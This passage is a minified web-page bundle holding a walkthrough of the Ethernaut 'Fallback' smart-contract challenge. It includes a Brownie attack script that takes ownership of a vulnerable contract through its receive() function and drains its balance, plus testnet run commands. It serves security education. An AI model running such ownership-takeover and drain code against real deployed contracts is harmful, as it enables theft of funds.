#82AAFF">contract_address</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> CONVERTED_AMOUNT</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    attack_tx</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">wait</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"Previous Address of the owner : </span><span style="color: #82AAFF">&#123;green&#125;&#123;owner&#125;&#123;reset&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"Current Address of the owner : </span><span style="color: #82AAFF">&#123;green&#125;&#123;fallback_contract</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">owner</span><span style="color: #89DDFF">()</span><span style="color: #82AAFF">&#125;&#123;reset&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"Address of the attacker : </span><span style="color: #82AAFF">&#123;green&#125;&#123;attacker&#125;&#123;reset&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #82AAFF">&#123;red&#125;</span><span style="color: #C3E88D">Hehe Wer're now the owner</span><span style="color: #82AAFF">&#123;reset&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #546E7A"># ? Draining the funds</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #82AAFF">&#123;magenta&#125;</span><span style="color: #C3E88D">Now Draining the funds!!!</span><span style="color: #82AAFF">&#123;reset&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    drain_tx </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> fallback_contract</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">withdraw</span><span style="color: #89DDFF">(&#123;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">from</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #82AAFF"> attacker</span><span style="color: #89DDFF">&#125;)</span></div><div class='line'><span style="color: #EEFFFF">    drain_tx</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">wait</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"Contract Balance: </span><span style="color: #82AAFF">&#123;green&#125;&#123;fallback_contract</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">balance</span><span style="color: #89DDFF">()</span><span style="color: #82AAFF">&#125;&#123;reset&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #82AAFF">&#123;red&#125;</span><span style="color: #C3E88D">All the money has been withdrawn!!</span><span style="color: #82AAFF">&#123;reset&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">main</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">contract_address</span><span style="color: #89DDFF">=None):</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> contract_address</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">attack</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">contract_address</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> get_account</span><span style="color: #89DDFF">())</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">else</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">attack</span><span style="color: #89DDFF">()</span></div></code></div></pre>`,Yl,E,Xl,ns,Fn,Jl,cn,rn,yn,Ql,se,dn,En,le,g,Dn,ee,vn,fn,ae,hn,un,oe,_n,An,mn,ne,u,wn,te,bn,Cn,pe,kn,gn,Fe,On,In,ce,Ln,Nn,Tn,re,O,xn,ie,Pn,Un,ye,Rn,jn,de,Mn,Sn,Wn,Ee,ts,Bn,De,$n,Vn,Hn,ve,fe,qn,pa,he,lc=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">fallback </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> interface</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Fallback</span><span style="color: #EEFFFF">(contract_address)</span></div></code></div></pre>`,ue,ps,ms,Kn,Fa,H,Fs,_e,zn,Zn,cs,Ae,Gn,Yn,I,Xn,me,Jn,Qn,we,st,lt,be,et,at,ot,Ce,D,nt,ke,tt,pt,ge,Ft,ct,Oe,rt,it,Ie,yt,dt,q,Et,Dt,ca,Le,ec=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #82AAFF">receive</span><span style="color: #EEFFFF">() external payable </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #82AAFF">require</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">value</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&gt;</span><span style="color: #F07178"> </span><span style="color: #F78C6C">0</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&&</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">contributions</span><span style="color: #F07178">[</span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender</span><span style="color: #F07178">] </span><span style="color: #89DDFF">&gt;</span><span style="color: #F07178"> </span><span style="color: #F78C6C">0</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #EEFFFF">owner</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">&#125;</span></div></code></div></pre>`,Ne,ws,Te,vt,ra,xe,ac=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">contrib_tx </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> fallback</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">contribute</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">&#123;</span><span style="color: #89DDFF">"</span><span style="color: #F07178">from</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> attacker</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #F07178">value</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> CONVERTED_AMOUNT</span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF">)</span></div><div class='line'><span style="color: #EEFFFF">contrib_tx</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">wait</span><span style="color: #EEFFFF">(</span><span style="color: #F78C6C">1</span><span style="color: #EEFFFF">)</span></div></code></div></pre>`,Pe,bs,rs,ft,Ue,ht,ut,ia,Re,oc=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">attack_tx </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> attacker</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">transfer</span><span style="color: #EEFFFF">(contract_address</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> CONVERTED_AMOUNT)</span></div><div class='line'><span style="color: #EEFFFF">attack_tx</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">wait</span><span style="color: #EEFFFF">(</span><span style="color: #F78C6C">1</span><span style="color: #EEFFFF">)</span></div></code></div></pre>`,je,Cs,is,_t,Me,At,mt,ya,Se,nc=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #82AAFF">require</span><span style="color: #EEFFFF">(msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">value </span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">0</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&&</span><span style="color: #EEFFFF"> contributions[msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender] </span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">0</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">owner </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender</span><span style="color: #89DDFF">;</span></div></code></div></pre>`,We,ks,ys,wt,Be,bt,Ct,da,ds,gs,kt,Ea,Os,$e,gt,Da,Ve,tc=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">brownie run .scriptsattack.py</span></div></code></div></pre>`,He,Is,Es,va,Ls,K,Ot,qe,It,Lt,Ke,Nt,fa,ze,pc=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">brownie run .scriptsattack.py main </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">0x4c7c62Ed79994383EEa5Cf156bd3159e9e12C385</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> --network rinkeby</span></div></code></div></pre>`,Ze,ha;return Es=new Ec({props:{src:"/assets/fallback.png"}}),{c(){y=a("ul"),_=a("li"),A=a("p"),x=a("code"),d=t("Difficulty"),C=t(": 1/10"),vs=c(),J=a("li"),fs=a("p"),Rs=a("code"),Ra=t("Objective"),ja=t(":"),Ma=c(),Q=a("ol"),js=a("li"),Sa=t("claim ownership of the contract"),Wa=c(),hs=a("li"),Ba=t("reduce its balance to "),Ms=a("code"),$a=t("0"),Va=c(),ss=a("li"),us=a("p"),Ss=a("code"),Ha=t("Things that might help"),qa=t(":"),Ka=c(),k=a("ol"),Ws=a("li"),za=t("How to send ether when interacting with an ABI"),Za=c(),Bs=a("li"),Ga=t("How to send ether outside of the ABI"),Ya=c(),$s=a("li"),Xa=t("Converting to and from wei/ether units (see help() command)"),Ja=c(),Vs=a("li"),Qa=t("Fallback methods"),so=c(),Hs=a("li"),qs=a("p"),Ks=a("code"),lo=t("Fallback.sol"),Je=c(),zs=new v(!1),Zs=c(),ls=a("h2"),_s=a("a"),eo=t("Solution"),Qe=c(),As=a("ul"),Gs=a("li"),ao=t("First initialise an empty brownie project using the following command"),sa=c(),Ys=new v(!1),Xs=c(),L=a("ul"),Js=a("li"),es=a("p"),oo=t("Save the "),Qs=a("code"),no=t("Fallback.sol"),to=t(" in the contracts folder."),po=c(),sl=a("li"),P=a("p"),Fo=t("Setup the environment in the "),ll=a("code"),co=t(".env"),ro=t(" file like this. "),el=a("code"),io=t("PRIVATE_KEY"),yo=t(" = wallet private key"),Eo=c(),al=a("li"),ol=a("p"),nl=a("code"),Do=t(".env"),la=c(),tl=new v(!1),pl=c(),S=a("ul"),as=a("li"),vo=t("Now we have to setup "),Fl=a("code"),fo=t("brownie-config.yaml"),ho=t(" file to flatten the contract & compile into ABI so that we can work with it (Only for testing locally)"),uo=c(),cl=a("li"),rl=a("code"),_o=t("brownie-config.yaml"),ea=c(),il=new v(!1),yl=c(),W=a("ul"),dl=a("li"),U=a("p"),Ao=t("We have to tell the solidity compiler to look for the imports locally & that’s what’s the "),El=a("code"),mo=t("remapping"),wo=t(" section is doing & thed "),Dl=a("code"),bo=t("dependencies"),Co=t(" section is downloading the dependencies locally."),ko=c(),vl=a("li"),B=a("p"),fl=a("code"),go=t("IFallback.sol"),Oo=t(" The interface. Which will make our work a lot easier. Save it inside the "),hl=a("code"),Io=t("interface"),Lo=t(" folder."),aa=c(),ul=new v(!1),_l=c(),$=a("ul"),os=a("li"),No=t("Now let’s write some scripts. First one is "),Al=a("code"),To=t("helpful_scripts"),xo=t(". This script helps us to get the testing accounts both for local testing & actual network testing."),Po=c(),ml=a("li"),wl=a("code"),Uo=t("helpful_scripts"),oa=c(),bl=new v(!1),Cl=c(),m=a("ul"),kl=a("li"),V=a("p"),gl=a("code"),Ro=t("network.show_active()"),jo=t(" is a built-in brownie method to check the network we’re testing. For rikeby the later "),Ol=a("code"),Mo=t("if"),So=t(" statement will get executed & our metamask wallet will be connected."),Wo=c(),Il=a("li"),w=a("p"),Ll=a("code"),Bo=t("FORKED_LOCAL_ENVIRONMENTS"),$o=t(" list contains the name of the local networks & "),Nl=a("code"),Vo=t("FORKED_LOCAL_ENVIRONMENTS"),Ho=t(" is only needed if we run our own blockchain env using ganache or something else. We don’t need that. In short this section will get executed if you use the tag "),Tl=a("code"),qo=t("--network mainnet-fork"),Ko=t(" with "),xl=a("code"),zo=t("brownie"),Zo=t(". More on that in the latter section."),Go=c(),Pl=a("li"),Ul=a("p"),Yo=t("Ok we have out accounts. Let’s deploy the code to test locally so that we don’t waste any ether."),Xo=c(),Rl=a("li"),jl=a("p"),Ml=a("code"),Jo=t("deploy.py"),na=c(),Sl=new v(!1),Wl=c(),N=a("ul"),Bl=a("li"),R=a("p"),Qo=t("First we’re importing the Fallback contract from brownie i.e. the ABI (I guess so :)). Then the next import is our "),$l=a("code"),sn=t("get_account"),ln=t(" function to get our testing accounts. This "),Vl=a("code"),en=t("deploy"),an=t(" function is deploying the contract locally & returnining the contract object & the address of the owner."),on=c(),Hl=a("li"),ql=a("p"),nn=t("Now the final & most important one."),tn=c(),Kl=a("li"),zl=a("p"),Zl=a("code"),pn=t("attack.py"),ta=c(),Gl=new v(!1),Yl=c(),E=a("ul"),Xl=a("li"),ns=a("p"),Fn=t("The imports are pretty basic. I hope you will undertand them. "),Jl=a("code"),cn=t("colorama"),rn=t(" is to make the outpur colourful. It’s pretty hard to read the output if it’s plain text."),yn=c(),Ql=a("li"),se=a("p"),dn=t("Next we have some global variables pretty much basic stuff & the names speaks for itself."),En=c(),le=a("li"),g=a("p"),Dn=t("Let’s start with the "),ee=a("code"),vn=t("main()"),fn=t(" function. It takes 1 parameter & it’s default value is set to "),ae=a("code"),hn=t("None"),un=t(" i.e. if we don’t pass any values then it’ll be set to "),oe=a("code"),_n=t("None"),An=t("."),mn=c(),ne=a("li"),u=a("p"),wn=t("If it’s not "),te=a("code"),bn=t("None"),Cn=t(" then we’re calling the "),pe=a("code"),kn=t("attack"),gn=t(" fn. with 2 parameters "),Fe=a("code"),On=t("contract_address"),In=t(" & with our account (the metamask wallte one). This one will get executed when we test the script on actual testnet for this case on "),ce=a("code"),Ln=t("rinkeby"),Nn=t("."),Tn=c(),re=a("li"),O=a("p"),xn=t("Else we’re just calling the "),ie=a("code"),Pn=t("attack"),Un=t(" fn. & it’ll not be a problem because see the fn. declaraion "),ye=a("code"),Rn=t("def attack(contract_address=None, attacker=None)"),jn=t(", the default values are "),de=a("code"),Mn=t("None"),Sn=t("."),Wn=c(),Ee=a("li"),ts=a("p"),Bn=t("Moving on, "),De=a("code"),$n=t("if contract_address is None:"),Vn=t(" will get executed when we’re testing locally. This one is just setting up the contract address & accounts which we deployed locally."),Hn=c(),ve=a("li"),fe=a("p"),qn=t("We’re making a contract object by using the interface we created easier & passing the address of our contract to it"),pa=c(),he=new v(!1),ue=c(),ps=a("h2"),ms=a("a"),Kn=t("Approach"),Fa=c(),H=a("ol"),Fs=a("li"),_e=a("p"),zn=t("We have to claim the contract i.e. we have to be the owner. For this we have to have contribute more than the owner. Which is a porblem for 2 reasons."),Zn=c(),cs=a("ol"),Ae=a("li"),Gn=t("We don’t have that much ether"),Yn=c(),I=a("li"),Xn=t("We can’t send more than "),me=a("code"),Jn=t("0.001"),Qn=t(" because of this line "),we=a("code"),st=t("require(msg.value < 0.001 ether)"),lt=t(" in "),be=a("code"),et=t("contribute"),at=t(" fn."),ot=c(),Ce=a("li"),D=a("p"),nt=t("What can we do here… Interestingly there is a "),ke=a("code"),tt=t("receive()"),pt=t(" method which is interesting. This one says that if we make any contribution which is greater than "),ge=a("code"),Ft=t("0"),ct=t(" then we’ll be the owner of the contract. But this doesn’t look like a normal fn. It doesn’t have the "),Oe=a("code"),rt=t("function"),it=t(" keyword. If we look at solidity documentation the "),Ie=a("code"),yt=t("receive()"),dt=t(" method is a special method (from solidity 6) that allows a contract to receive payments i.e. ether. Ok coool. More on "),q=a("a"),Et=t("receive"),Dt=t(" fn."),ca=c(),Le=new v(!1),Ne=c(),ws=a("ul"),Te=a("li"),vt=t("Let’s attack it now. First we’re sending some ether to this contract."),ra=c(),xe=new v(!1),Pe=c(),bs=a("ul"),rs=a("li"),ft=t("Now we’re using the "),Ue=a("code"),ht=t("transfer"),ut=t(" functionality of brownie to send the money to the contract."),ia=c(),Re=new v(!1),je=c(),Cs=a("ul"),is=a("li"),_t=t("By invoking this function we’re matching the require statement in the "),Me=a("code"),At=t("require()"),mt=t(" method of the contract & this will make us the new owner."),ya=c(),Se=new v(!1),We=c(),ks=a("ul"),ys=a("li"),wt=t("Now to complete the challenge we have to drain all the funds. It’s easy now as we’re now the owner we cann call the built-in "),Be=a("code"),bt=t("withdraw()"),Ct=t(" function."),da=c(),ds=a("h2"),gs=a("a"),kt=t("Using Brownie to run the program"),Ea=c(),Os=a("ul"),$e=a("li"),gt=t("To run on local development environment. This will compile all the nesessary files & run the attack script."),Da=c(),Ve=new v(!1),He=c(),Is=a("p"),BF(Es.$$.fragment),va=c(),Ls=a("ul"),K=a("li"),Ot=t("To run on "),qe=a("code"),It=t("rikeby"),Lt=t(" network use this command. Syntax is "),Ke=a("code"),Nt=t("brownie run <script.py> <function name> <contract address> --network rikeby"),fa=c(),ze=new v(!1),Ze=SF(),this.h()},l(l){y=o(l,"UL",{});var F=n(y);_=o(F,"LI",{});var jt=n(_);A=o(jt,"P",{});var Tt=n(A);x=o(Tt,"CODE",{});var Mt=n(x);d=p(Mt,"Difficulty"),Mt.forEach(e),C=p(Tt,": 1/10"),Tt.forEach(e),jt.forEach(e),vs=r(F),J=o(F,"LI",{});var ua=n(J);fs=o(ua,"P",{});var xt=n(fs);Rs=o(xt,"CODE",{});var St=n(Rs);Ra=p(St,"Objective"),St.forEach(e),ja=p(xt,":"),xt.forEach(e),Ma=r(ua),Q=o(ua,"OL",{});var _a=n(Q);js=o(_a,"LI",{});var Wt=n(js);Sa=p(Wt,"claim ownership of the contract"),Wt.forEach(e),Wa=r(_a),hs=o(_a,"LI",{});var Pt=n(hs);Ba=p(Pt,"reduce its balance to "),Ms=o(Pt,"CODE",{});var Bt=n(Ms);$a=p(Bt,"0"),Bt.forEach(e),Pt.forEach(e),_a.forEach(e),ua.forEach(e),Va=r(F),ss=o(F,"LI",{});var Aa=n(ss);us=o(Aa,"P",{});var Ut=n(us);Ss=o(Ut,"CODE",{});var $t=n(Ss);Ha=p($t,"Things that might help"),$t.forEach(e),qa=p(Ut,":"),Ut.forEach(e),Ka=r(Aa),k=o(Aa,"OL",{});var z=n(k);Ws=o(z,"LI",{});var Vt=n(Ws);za=p(Vt,"How to send ether when interacting with an ABI"),Vt.forEach(e),Za=r(z),Bs=o(z,"LI",{});var Ht=n(Bs);Ga=p(Ht,"How to send ether outside of the ABI"),Ht.forEach(e),Ya=r(z),$s=o(z,"LI",{});var qt=n($s);Xa=p(qt,"Converting to and from wei/ether units (see help() command)"),qt.forEach(e),Ja=r(z),Vs=o(z,"LI",{});var Kt=n(Vs);Qa=p(Kt,"Fallback methods"),Kt.forEach(e),z.forEach(e),Aa.forEach(e),so=r(F),Hs=o(F,"LI",{});var zt=n(Hs);qs=o(zt,"P",{});var Zt=n(qs);Ks=o(Zt,"CODE",{});var Gt=n(Ks);lo=p(Gt,"Fallback.sol"),Gt.forEach(e),Zt.forEach(e),zt.forEach(e),F.forEach(e),Je=r(l),zs=f(l,!1),Zs=r(l),ls=o(l,"H2",{id:!0});var Yt=n(ls);_s=o(Yt,"A",{href:!0});var Xt=n(_s);eo=p(Xt,"Solution"),Xt.forEach(e),Yt.forEach(e),Qe=r(l),As=o(l,"UL",{});var Jt=n(As);Gs=o(Jt,"LI",{});var Qt=n(Gs);ao=p(Qt,"First initialise an empty brownie project using the following command"),Qt.forEach(e),Jt.forEach(e),sa=r(l),Ys=f(l,!1),Xs=r(l),L=o(l,"UL",{});var Ns=n(L);Js=o(Ns,"LI",{});var sp=n(Js);es=o(sp,"P",{});var ma=n(es);oo=p(ma,"Save the "),Qs=o(ma,"CODE",{});var lp=n(Qs);no=p(lp,"Fallback.sol"),lp.forEach(e),to=p(ma," in the contracts folder."),ma.forEach(e),sp.forEach(e),po=r(Ns),sl=o(Ns,"LI",{});var ep=n(sl);P=o(ep,"P",{});var Ts=n(P);Fo=p(Ts,"Setup the environment in the "),ll=o(Ts,"CODE",{});var ap=n(ll);co=p(ap,".env"),ap.forEach(e),ro=p(Ts," file like this. "),el=o(Ts,"CODE",{});var op=n(el);io=p(op,"PRIVATE_KEY"),op.forEach(e),yo=p(Ts," = wallet private key"),Ts.forEach(e),ep.forEach(e),Eo=r(Ns),al=o(Ns,"LI",{});var np=n(al);ol=o(np,"P",{});var tp=n(ol);nl=o(tp,"CODE",{});var pp=n(nl);Do=p(pp,".env"),pp.forEach(e),tp.forEach(e),np.forEach(e),Ns.forEach(e),la=r(l),tl=f(l,!1),pl=r(l),S=o(l,"UL",{});var wa=n(S);as=o(wa,"LI",{});var ba=n(as);vo=p(ba,"Now we have to setup "),Fl=o(ba,"CODE",{});var Fp=n(Fl);fo=p(Fp,"brownie-config.yaml"),Fp.forEach(e),ho=p(ba," file to flatten the contract & compile into ABI so that we can work with it (Only for testing locally)"),ba.forEach(e),uo=r(wa),cl=o(wa,"LI",{});var cp=n(cl);rl=o(cp,"CODE",{});var rp=n(rl);_o=p(rp,"brownie-config.yaml"),rp.forEach(e),cp.forEach(e),wa.forEach(e),ea=r(l),il=f(l,!1),yl=r(l),W=o(l,"UL",{});var Ca=n(W);dl=o(Ca,"LI",{});var ip=n(dl);U=o(ip,"P",{});var xs=n(U);Ao=p(xs,"We have to tell the solidity compiler to look for the imports locally & that’s what’s the "),El=o(xs,"CODE",{});var yp=n(El);mo=p(yp,"remapping"),yp.forEach(e),wo=p(xs," section is doing & thed "),Dl=o(xs,"CODE",{});var dp=n(Dl);bo=p(dp,"dependencies"),dp.forEach(e),Co=p(xs," section is downloading the dependencies locally."),xs.forEach(e),ip.forEach(e),ko=r(Ca),vl=o(Ca,"LI",{});var Ep=n(vl);B=o(Ep,"P",{});var Ge=n(B);fl=o(Ge,"CODE",{});var Dp=n(fl);go=p(Dp,"IFallback.sol"),Dp.forEach(e),Oo=p(Ge," The interface. Which will make our work a lot easier. Save it inside the "),hl=o(Ge,"CODE",{});var vp=n(hl);Io=p(vp,"interface"),vp.forEach(e),Lo=p(Ge," folder."),Ge.forEach(e),Ep.forEach(e),Ca.forEach(e),aa=r(l),ul=f(l,!1),_l=r(l),$=o(l,"UL",{});var ka=n($);os=o(ka,"LI",{});var ga=n(os);No=p(ga,"Now let’s write some scripts. First one is "),Al=o(ga,"CODE",{});var fp=n(Al);To=p(fp,"helpful_scripts"),fp.forEach(e),xo=p(ga,". This script helps us to get the testing accounts both for local testing & actual network testing."),ga.forEach(e),Po=r(ka),ml=o(ka,"LI",{});var hp=n(ml);wl=o(hp,"CODE",{});var up=n(wl);Uo=p(up,"helpful_scripts"),up.forEach(e),hp.forEach(e),ka.forEach(e),oa=r(l),bl=f(l,!1),Cl=r(l),m=o(l,"UL",{});var Z=n(m);kl=o(Z,"LI",{});var _p=n(kl);V=o(_p,"P",{});var Ye=n(V);gl=o(Ye,"CODE",{});var Ap=n(gl);Ro=p(Ap,"network.show_active()"),Ap.forEach(e),jo=p(Ye," is a built-in brownie method to check the network we’re testing. For rikeby the later "),Ol=o(Ye,"CODE",{});var mp=n(Ol);Mo=p(mp,"if"),mp.forEach(e),So=p(Ye," statement will get executed & our metamask wallet will be connected."),Ye.forEach(e),_p.forEach(e),Wo=r(Z),Il=o(Z,"LI",{});var wp=n(Il);w=o(wp,"P",{});var j=n(w);Ll=o(j,"CODE",{});var bp=n(Ll);Bo=p(bp,"FORKED_LOCAL_ENVIRONMENTS"),bp.forEach(e),$o=p(j," list contains the name of the local networks & "),Nl=o(j,"CODE",{});var Cp=n(Nl);Vo=p(Cp,"FORKED_LOCAL_ENVIRONMENTS"),Cp.forEach(e),Ho=p(j," is only needed if we run our own blockchain env using ganache or something else. We don’t need that. In short this section will get executed if you use the tag "),Tl=o(j,"CODE",{});var kp=n(Tl);qo=p(kp,"--network mainnet-fork"),kp.forEach(e),Ko=p(j," with "),xl=o(j,"CODE",{});var gp=n(xl);zo=p(gp,"brownie"),gp.forEach(e),Zo=p(j,". More on that in the latter section."),j.forEach(e),wp.forEach(e),Go=r(Z),Pl=o(Z,"LI",{});var Op=n(Pl);Ul=o(Op,"P",{});var Ip=n(Ul);Yo=p(Ip,"Ok we have out accounts. Let’s deploy the code to test locally so that we don’t waste any ether."),Ip.forEach(e),Op.forEach(e),Xo=r(Z),Rl=o(Z,"LI",{});var Lp=n(Rl);jl=o(Lp,"P",{});var Np=n(jl);Ml=o(Np,"CODE",{});var Tp=n(Ml);Jo=p(Tp,"deploy.py"),Tp.forEach(e),Np.forEach(e),Lp.forEach(e),Z.forEach(e),na=r(l),Sl=f(l,!1),Wl=r(l),N=o(l,"UL",{});var Ps=n(N);Bl=o(Ps,"LI",{});var xp=n(Bl);R=o(xp,"P",{});var Us=n(R);Qo=p(Us,"First we’re importing the Fallback contract from brownie i.e. the ABI (I guess so :)). Then the next import is our "),$l=o(Us,"CODE",{});var Pp=n($l);sn=p(Pp,"get_account"),Pp.forEach(e),ln=p(Us," function to get our testing accounts. This "),Vl=o(Us,"CODE",{});var Up=n(Vl);en=p(Up,"deploy"),Up.forEach(e),an=p(Us," function is deploying the contract locally & returnining the contract object & the address of the owner."),Us.forEach(e),xp.forEach(e),on=r(Ps),Hl=o(Ps,"LI",{});var Rp=n(Hl);ql=o(Rp,"P",{});var jp=n(ql);nn=p(jp,"Now the final & most important one."),jp.forEach(e),Rp.forEach(e),tn=r(Ps),Kl=o(Ps,"LI",{});var Mp=n(Kl);zl=o(Mp,"P",{});var Sp=n(zl);Zl=o(Sp,"CODE",{});var Wp=n(Zl);pn=p(Wp,"attack.py"),Wp.forEach(e),Sp.forEach(e),Mp.forEach(e),Ps.forEach(e),ta=r(l),Gl=f(l,!1),Yl=r(l),E=o(l,"UL",{});var h=n(E);Xl=o(h,"LI",{});var Bp=n(Xl);ns=o(Bp,"P",{});var Oa=n(ns);Fn=p(Oa,"The imports are pretty basic. I hope you will undertand them. "),Jl=o(Oa,"CODE",{});var $p=n(Jl);cn=p($p,"colorama"),$p.forEach(e),rn=p(Oa," is to make the outpur colourful. It’s pretty hard to read the output if it’s plain text."),Oa.forEach(e),Bp.forEach(e),yn=r(h),Ql=o(h,"LI",{});var Vp=n(Ql);se=o(Vp,"P",{});var Hp=n(se);dn=p(Hp,"Next we have some global variables pretty much basic stuff & the names speaks for itself."),Hp.forEach(e),Vp.forEach(e),En=r(h),le=o(h,"LI",{});var qp=n(le);g=o(qp,"P",{});var G=n(g);Dn=p(G,"Let’s start with the "),ee=o(G,"CODE",{});var Kp=n(ee);vn=p(Kp,"main()"),Kp.forEach(e),fn=p(G," function. It takes 1 parameter & it’s default value is set to "),ae=o(G,"CODE",{});var zp=n(ae);hn=p(zp,"None"),zp.forEach(e),un=p(G," i.e. if we don’t pass any values then it’ll be set to "),oe=o(G,"CODE",{});var Zp=n(oe);_n=p(Zp,"None"),Zp.forEach(e),An=p(G,"."),G.forEach(e),qp.forEach(e),mn=r(h),ne=o(h,"LI",{});var Gp=n(ne);u=o(Gp,"P",{});var T=n(u);wn=p(T,"If it’s not "),te=o(T,"CODE",{});var Yp=n(te);bn=p(Yp,"None"),Yp.forEach(e),Cn=p(T," then we’re calling the "),pe=o(T,"CODE",{});var 